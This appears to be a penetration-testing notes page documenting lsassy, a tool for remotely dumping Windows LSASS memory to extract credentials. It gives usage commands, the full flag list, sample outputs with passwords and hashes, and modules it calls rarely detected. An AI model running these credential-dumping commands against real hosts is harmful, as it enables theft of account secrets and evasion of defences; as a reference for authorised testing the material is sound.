---
title : "Lsassy"
# pre : ' '
description : "Python library to remotely extract credentials on a set of hosts."
date : 2020-05-15T09:32:35+02:00
# hidden : true
# draft : true
weight : 200
tags : ['Framework', 'LSASS']
---

---

Remote LSASS dumper - Python library to remotely extract credentials on a set of hosts.

## Installation

```plain
python3 -m pip install lsassy
```

## Usage

```plain
lsassy [-h] [-m DUMP_METHOD] [--dump-path DUMP_PATH] [--dump-name DUMP_NAME] [-e EXEC] [--no-powershell] [--copy] [-O OPTIONS] [--timeout TIMEOUT] [--time-between-commands TIME_BETWEEN_COMMANDS] [--parse-only]
              [--dump-only] [--keep-dump] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [--port PORT] [--no-pass] [-H HASHES] [-k] [-dc-ip ip address] [-aesKey hex key] [-K KERBEROS_DIR] [-M MASTERKEYS_FILE] [-o OUTFILE]
              [-f {pretty,json,grep,table}] [-ff {pretty,json,grep,table}] [-nc] [--users] [--no-tickets] [--masterkeys] [-v] [--threads THREADS] [-q] [-V]
              [target ...]
```

## Flags

```plain
lsassy v3.1.9 - Remote lsass dump reader

positional arguments:
  target                The target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets

options:
  -h, --help            show this help message and exit
  -v                    Verbosity level (-v or -vv)
  --threads THREADS     Threads number
  -q, --quiet           Quiet mode, only display credentials
  -V, --version         show program's version number and exit

dump:
  -m DUMP_METHOD, --dump-method DUMP_METHOD
                        Dumping method (comsvcs, comsvcs_stealth, dllinject, dumpert, dumpertdll, edrsandblast, mirrordump, mirrordump_embedded, nanodump, nanodump_ssp_embedded, ppldump, ppldump_embedded, procdump,
                        procdump_embedded, rawrpc, rawrpc_embedded, rdrleakdiag, silentprocessexit, sqldumper, wer)
  --dump-path DUMP_PATH
                        Path to store lsass dumpfile (Default: \Windows\Temp)
  --dump-name DUMP_NAME
                        Name given to lsass dumpfile (Default: Random)
  -e EXEC, --exec EXEC  List of execution methods, comma separated (From mmc, smb, smb_stealth, task, wmi)
  --no-powershell       Disable PowerShell
  --copy                Copies cmd or powershell with random name before using it
  -O OPTIONS, --options OPTIONS
                        Dump module options (Example procdump_path=/opt/procdump.exe,procdump=procdump.exe
  --timeout TIMEOUT     Max time to wait for lsass dump (Default 5s)
  --time-between-commands TIME_BETWEEN_COMMANDS
                        Time to wait between dump methods commands (Default 1s)
  --parse-only          Parse dump without dumping
  --dump-only           Dump lsass without parsing it
  --keep-dump           Do not delete lsass dump on remote host

authentication:
  -u USERNAME, --username USERNAME
                        Username
  -p PASSWORD, --password PASSWORD
                        Plaintext password
  -d DOMAIN, --domain DOMAIN
                        Domain name
  --port PORT           Port (Default: 445)
  --no-pass             Do not provide password (Default: False)
  -H HASHES, --hashes HASHES
                        [LM:]NT hash
  -k, --kerberos        Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

output:
  -K KERBEROS_DIR, --kerberos-dir KERBEROS_DIR
                        Save kerberos tickets to a directory
  -M MASTERKEYS_FILE, --masterkeys-file MASTERKEYS_FILE
                        Save masterkeys in format {GUID}:SHA1 to a file
  -o OUTFILE, --outfile OUTFILE
                        Output credentials to file
  -f {pretty,json,grep,table}, --format {pretty,json,grep,table}
                        Output format (Default pretty)
  -ff {pretty,json,grep,table}, --file-format {pretty,json,grep,table}
                        File format (Default same value as --format)
  -nc, --no-color       No colors in output
  --users               Only display user accounts (No computer accounts)
  --no-tickets          Do not display valid TGT
  --masterkeys          Display valid masterkeys
```

## Examples

### Dump lsass from single target

```plain
$ lsassy -d <domain> -u '<domain-admin>or<local-admin>' -p '<password>' <target>

[+] [10.10.10.10] offsec.nl\john.do   Welkom1234
```

### Dump lsass from range of IP's

```plain
$ lsassy -d <domain> -u '<domain-admin>or<local-admin>' -p '<password>' 10.10.10.10-12

[+] [10.10.10.10] offsec.nl\john.do   Welkom1234
[+] [10.10.10.11] offsec.nl\jane.do   Welk0m4
[+] [10.10.10.12] offsec.nl\el.prof   NietWelkom
```

### Dump lsass with module

Modules that can be used without prerequisites and from experience are not generally detected:

- comsvcs_stealth
- procdump_embedded
- mirrordump_embedded

#### comsvcs_stealth

```plain
$ lsassy -d offsec.nl -u john.do -p 'Welkom1234' 10.10.10.10 -m comsvcs_stealth
[+] 10.10.10.10 Authentication successful
[+] 10.10.10.10 Comsvcs.dll successfuly copied
[+] 10.10.10.10 Lsass dumped in C:\Windows\Temp\R0fDNwVOq.ttf (215340545 Bytes)
[+] 10.10.10.10 Lsass dump deleted
[+] 10.10.10.10 OFFSEC\adm_johndo           [NT] 80a2cc87940725[...]562de29 | [SHA1] c58e8057[...]5df5c7d8a10afe5d
[+] 10.10.10.10 OFFSEC\PDC01$    [NT] cb381530[...]45ee76 | [SHA1] e16078f9f6939f0[...]93156b55db
[+] 10.10.10.10 offsec.nl\PDC01$  [PWD] d52be466975b3728c2acc13d9a7422a7b10[...]e0a7795122cb2ee55537
[+] 10.10.10.10 OFFSEC\PDC01$    [NT] 9e333[...]9b27607fc | [SHA1] 3b8152bd[...]2255e3ea72c
[+] 10.10.10.10 offsec.nl\PDC01$  [PWD] c1e3cebd8f9628c752b34ca1290d8771cb159fedb2298219f7[...]28bc2fe4ddc56b0e98a019bb072
```

#### Dumpert

{{%resources title="Compiled binaries" fa_icon_class="far fa-file" pattern=".*(exe|dll)"/%}}}

## URL List

- [GitHub.com - lsassy](https://github.com/Hackndo/lsassy)
- [Github.com - Dumpert](https://github.com/outflanknl/Dumpert)
